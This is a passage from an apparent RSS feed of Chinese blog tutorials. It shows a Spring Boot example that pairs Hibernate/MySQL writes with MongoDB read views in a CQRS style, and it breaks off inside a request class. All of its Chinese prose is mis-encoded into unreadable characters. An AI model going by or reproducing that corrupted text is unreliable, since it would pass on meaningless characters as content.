<li><strong>å¯åŠ¨MySQL</strong>ï¼šç¡®ä¿ä½ çš„MySQLæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:3306</code>ã€‚</li>
<li><strong>åˆ›å»ºæ•°æ®åº“</strong>ï¼šåˆ›å»ºä¸€ä¸ªåä¸º<code>mydatabase</code>çš„æ•°æ®åº“ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-16">9. è®¿é—®API</h3>
<p>é€šè¿‡ä»¥ä¸‹APIè®¿é—®<code>Order</code>æ•°æ®ï¼š</p>
<ul>
<li><code>POST /orders</code>ï¼šåˆ›å»ºOrderã€‚</li>
<li><code>PUT /orders/{id}</code>ï¼šæ›´æ–°Orderã€‚</li>
<li><code>DELETE /orders/{id}</code>ï¼šåˆ é™¤Orderã€‚</li>
<li><code>GET /orders/{id}</code>ï¼šæŒ‰IDè·å–Orderã€‚</li>
</ul>
<h3 data-id="heading-17">æ€»ç»“</h3>
<p>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•åœ¨DDDä¸­ä½¿ç”¨Hibernateï¼ŒåŒ…æ‹¬å®šä¹‰é¢†åŸŸæ¨¡å‹ã€åˆ›å»ºä»“å‚¨æ¥å£ã€å®ç°é¢†åŸŸæœåŠ¡å’Œåº”ç”¨æœåŠ¡ä»¥åŠåˆ›å»ºæ§åˆ¶å™¨ã€‚åœ¨DDDä¸­ï¼Œé‡ç‚¹æ˜¯å°†ä¸šåŠ¡é€»è¾‘å°è£…åœ¨é¢†åŸŸå¯¹è±¡å’Œé¢†åŸŸæœåŠ¡ä¸­ï¼Œé€šè¿‡å­˜å‚¨åº“æ¨¡å¼å¤„ç†æŒä¹…åŒ–ã€‚Hibernateä½œä¸ºORMå·¥å…·ï¼Œå¯ä»¥å¾ˆå¥½åœ°å¤„ç†é¢†åŸŸå¯¹è±¡çš„æŒä¹…åŒ–ï¼Œä»è€Œå®ç°æ¸…æ™°çš„ä¸šåŠ¡é€»è¾‘å’ŒæŒä¹…åŒ–é€»è¾‘åˆ†ç¦»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600955777316519974</link>    <guid>https://juejin.cn/post/7600955777316519974</guid>    <pubDate>2026-01-30T23:40:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316519974" data-draft-id="7600953879501406259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T23:40:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:58.000Z" title="Fri Jan 30 2026 23:40:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Œæ„å‘³ç€ä½¿ç”¨ä¸åŒçš„æ•°æ®åº“æˆ–å­˜å‚¨æŠ€æœ¯æ¥å¤„ç†ä¸åŒçš„æ•°æ®æŒä¹…åŒ–éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨å…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MySQLï¼‰å’ŒNoSQLæ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ã€‚è¿™ç§æ–¹æ³•åœ¨CQRSï¼ˆCommand Query Responsibility Segregationï¼‰æˆ–å…¶ä»–å¤šå­˜å‚¨æŠ€æœ¯æ¶æ„ä¸­éå¸¸å¸¸è§ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå’ŒMongoDBå®ç°æ··åˆæŒä¹…åŒ–ã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data MongoDB --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’Œå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®MySQLå’ŒMongoDBæ•°æ®æºï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# MongoDB Configuration
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=myquerydatabase
</code></pre>
<h3 data-id="heading-2">3. åˆ›å»ºé¢†åŸŸæ¨¡å‹</h3>
<h4 data-id="heading-3">ä½¿ç”¨MySQLçš„å®ä½“ç±»å’Œä»“å‚¨æ¥å£</h4>
<h5 data-id="heading-4"><code>Order.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h5 data-id="heading-5"><code>OrderItem.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h5 data-id="heading-6"><code>OrderRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h4 data-id="heading-7">ä½¿ç”¨MongoDBçš„å®ä½“ç±»å’Œä»“å‚¨æ¥å£</h4>
<h5 data-id="heading-8"><code>OrderView.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> org.springframework.data.annotation.Id;
<span class="hljs-keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Document(collection = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderView</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> totalPrice;
}
</code></pre>
<h5 data-id="heading-9"><code>OrderViewRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderViewRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MongoRepository</span>&lt;OrderView, String&gt; {
}
</code></pre>
<h3 data-id="heading-10">4. åˆ›å»ºæœåŠ¡å±‚</h3>
<h4 data-id="heading-11">å†™æ“ä½œæœåŠ¡ï¼ˆCommand Serviceï¼‰</h4>
<h5 data-id="heading-12"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(savedOrder);
        <span class="hljs-keyword">return</span> savedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(updatedOrder);
        <span class="hljs-keyword">return</span> updatedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
        orderViewRepository.deleteById(id.toString());
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncOrderView</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>();
        orderView.setId(order.getId().toString());
        orderView.setCustomerName(order.getCustomerName());
        orderView.setCustomerAddress(order.getCustomerAddress());
        orderView.setTotalPrice(order.calculateTotalPrice());
        orderViewRepository.save(orderView);
    }
}
</code></pre>
<h4 data-id="heading-13">è¯»æ“ä½œæœåŠ¡ï¼ˆQuery Serviceï¼‰</h4>
<h5 data-id="heading-14"><code>OrderQueryService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-keyword">public</span> List&lt;OrderView&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findAll();
    }

    <span class="hljs-keyword">public</span> Optional&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findById(id);
    }
}
</code></pre>
<h3 data-id="heading-15">5. åˆ›å»ºæ§åˆ¶å™¨</h3>
<h4 data-id="heading-16">å†™æ“ä½œæ§åˆ¶å™¨ï¼ˆCommand Controllerï¼‰</h4>
<h5 data-id="heading-17"><code>OrderCommandController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCommandService orderCommandService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderCommandService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(id);
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderCommandService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderCommandService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h4 data-id="heading-18">è¯»æ“ä½œæ§åˆ¶å™¨ï¼ˆQuery Controllerï¼‰</h4>
<h5 data-id="heading-19"><code>OrderQueryController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/order-views")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderQueryService orderQueryService;

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;OrderView&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;OrderView&gt; orders = orderQueryService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
        <span class="hljs-keyword">return</span> orderQueryService.getOrderById(id)
                .map(ResponseEntity::ok)
                .orElse(ResponseEntity.notFound().build());
    }
}
</code></pre>
<h4 data-id="heading-20">è¯·æ±‚å¯¹è±¡</h4>
<h5 data-id="heading-21"><code>CreateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h5 data-id="heading-22"><code>UpdateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
